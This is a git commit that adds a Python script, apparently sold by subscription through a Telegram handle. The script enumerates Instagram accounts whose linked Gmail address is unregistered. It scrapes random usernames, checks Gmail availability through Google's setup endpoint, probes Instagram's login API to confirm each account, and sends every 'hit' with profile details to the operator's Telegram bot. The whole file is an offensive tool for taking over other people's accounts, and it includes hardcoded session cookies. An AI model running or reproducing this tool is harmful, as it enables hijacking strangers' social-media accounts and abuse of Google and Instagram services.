6135623fcc6c681a6b6d316aad0a5b0859738214
WooprieLegalcy <127328073+WooprieLegalcy@users.noreply.github.com>
2023-04-17 04:52:07 +0400

    Add files via upload

---
+++ InstagramB.py
@@ -0,0 +1,238 @@
+
+import requests,colorama,mechanize
+from tokenize import cookie_re
+import requests
+import requests,os,names,json,random
+import requests,os,names,random,time
+from user_agent import generate_user_agent
+from uuid import uuid4
+uid = uuid4()
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+
+
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2023, 6, 6, 20, 0 ,0)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\n\n')
+ print("     "+'تم توقيف اداة راسل المبرمج لتفعيله @J_C_A')
+ print('\n\n')
+ print(x)
+ 
+ sys.exit(0)
+ 
+
+if (x.strftime("%x"))==(g.strftime("%x")):
+   print('')
+   if(x.strftime("%X"))>(g.strftime("%X")):
+    print('\n\n')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @J_C_A☄️🗿')
+    print('\n\n')
+    print(x)
+    
+    sys.exit(0)
+   else:
+    print('')  
+else:
+    print('')
+print('')
+
+
+os.system('clear')
+import os,time,random,requests,json,sys
+from user_agent import generate_user_agent
+from uuid import uuid4
+from time import sleep
+import webbrowser, random, requests
+from user_agent import generate_user_agent
+import json
+from secrets import token_hex
+import secrets, sys
+
+#------------------------------[الالوان]------------------------------
+Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+C1 = '\033[2;35m'
+#------------------------------[ALSAYED]------------------------------
+
+
+
+
+
+def azz():
+  
+  azro = (f"""{X}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                    
+      ╔════════════════════════════════════════╗
+      ║[⌯]  Telegram    : ALSAYED  
+      ║[⌯]  Telegram   : @J_C_A      
+      ╚════════════════════════════════════════╝ 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}{Z}\n\n\n\n""")
+  for azr in azro.splitlines():
+    time.sleep(0.05)
+    print(azr)
+azz()
+uid = uuid4()
+Name = str(input(X+'⌯ '+B+' 𝐍𝐀𝐌𝐄 اسمك '+C1+' » '+F))
+if Name =='':
+	exit(Z+'NOT NAME')
+os.system('clear')
+time.sleep(1)
+print(f'{B}⌯ {Z}WELCOME {Name} ✿ \n\n')
+
+token = input(Z+'⌯ '+B+' 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 توكنك  '+C1+'    » '+Y)
+
+ID = input(Z+'⌯ '+B+'𝐄𝐧𝐭𝐞𝐫 𝐈𝐃 ايديك  '+C1+' » '+Y)
+
+sid = input(Z+'⌯ '+B+' 𝐒𝐞𝐚𝐬𝐨𝐧 𝐈𝐃 سيزون ايدي  '+C1+' » '+Y)
+print(B+' ⌯ '+X+' انتضر دتفحص '+X+'....')
+tlg1 =(f"""
+𝐍𝐀𝐌𝐄 {Name}  ✪
+⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷
+جار صيد
+⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷
+B Y : @J_C_A """)
+
+
+requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg1))
+
+
+YY =0
+head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sid}
+def check(email,user): 
+ user=str(user)
+ email=str(email)
+
+ global YY
+ url='https://i.instagram.com/api/v1/accounts/login/'
+ headers = {'User-Agent':'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',  'Accept':'*/*',
+                 'Cookie':'missing',
+                 'Accept-Encoding':'gzip, deflate',
+                 'Accept-Language':'en-US',
+                 'X-IG-Capabilities':'3brTvw==',
+                 'X-IG-Connection-Type':'WIFI',
+                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+              'Host':'i.instagram.com'}
+ data = {'uuid':uid,  'password':'@whisper666',
+              'username':email,
+              'device_id':uid,
+              'from_reg':'false',
+              '_csrftoken':'missing',
+              'login_attempt_countn':'0'}
+
+ req= requests.post(url, headers=headers, data=data).json()
+ if req['message'] == 'The password you entered is incorrect. Please try again.':
+   rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
+   nam = str(rr['graphql']['user']['full_name'])
+   iddd = str(rr['graphql']['user']['id'])
+   fol = str(rr['graphql']['user']['edge_followed_by']['count'])
+   fols =str(rr['graphql']['user']['edge_follow']['count'])
+   isp = str(rr['graphql']['user']['is_private'])
+   bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
+   re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
+   ree = re.json()
+   dat = ree['date']
+   
+   
+   
+
+
+   YY+=1
+   tlg =(f"""
+Hello {Name} NEW HIT ⤋
+𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇
+⋘─────━𓆩𝐀𝐋𝐒𝐀𝐘𝐄𝐃𓆪‏━─────⋙
+⌯ Hit » {YY}
+⌯ Name » {nam}
+⌯ UserName » {user}
+⌯ Email » {email}
+⌯ ID » {iddd}
+⌯ Followers » {fol}
+⌯ Following » {fols}
+⌯ Private » {isp}
+⌯ Data » {dat}
+⌯ Posts » {bio}
+⌯ Time » {x}
+⌯ Link » https://www.instagram.com/{user}
+⋘─────━𓆩𝐀𝐋𝐒𝐀𝐘𝐄𝐃𓆪‏━─────⋙
+BY  : @J_C_A """)
+   print(C1+tlg)
+   
+   
+   requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
+ if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
+   print(f'{X} Bad IG {B} : {X} {email}')
+   
+
+def yahoo(email,user):
+  global i
+  
+  
+  eml=str(email)
+  email=eml.split('@')[0]+'@gmail.com'
+  url = 'https://android.clients.google.com/setup/checkavail'
+  h = {
+    'Content-Length':'98',
+    'Content-Type':'text/plain; charset=UTF-8',
+    'Host':'android.clients.google.com',
+    'Connection':'Keep-Alive',
+    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
+    }
+  d = json.dumps({
+    'username':email,
+    'version':'3',
+    'firstName':'AbaLahb',
+    'lastName':'AbuJahl'
+  })
+  res = requests.post(url,data=d,headers=h)
+  if res.json()['status'] == 'SUCCESS':
+    print(f'{F} Good Gmail {B} : {F} {email}')
+    check(email,user)
+  else:
+    print(f'{Z} Bad Gmail {B} : {Z} {email}')
+def users():
+ while True:
+#  mal=['male','femal']
+#  gen=random.choice(mal)
+  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
+  num='6789'
+  rng=int("".join(random.choice(num)for i in range(1)))
+  name=str("".join(random.choice(user)for i in range(rng)))
+  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
+  mn=0
+  try:
+   while True:
+    mn += 1
+    user=str(whisper['users'][mn]['user']['username'])
+    emai=user
+    email=emai+'@gmail.com'
+    if '_' in str(email):
+      
+      continue
+    else :
+      
+      yahoo(email,user)
+  except IndexError:
+   users()
+users()
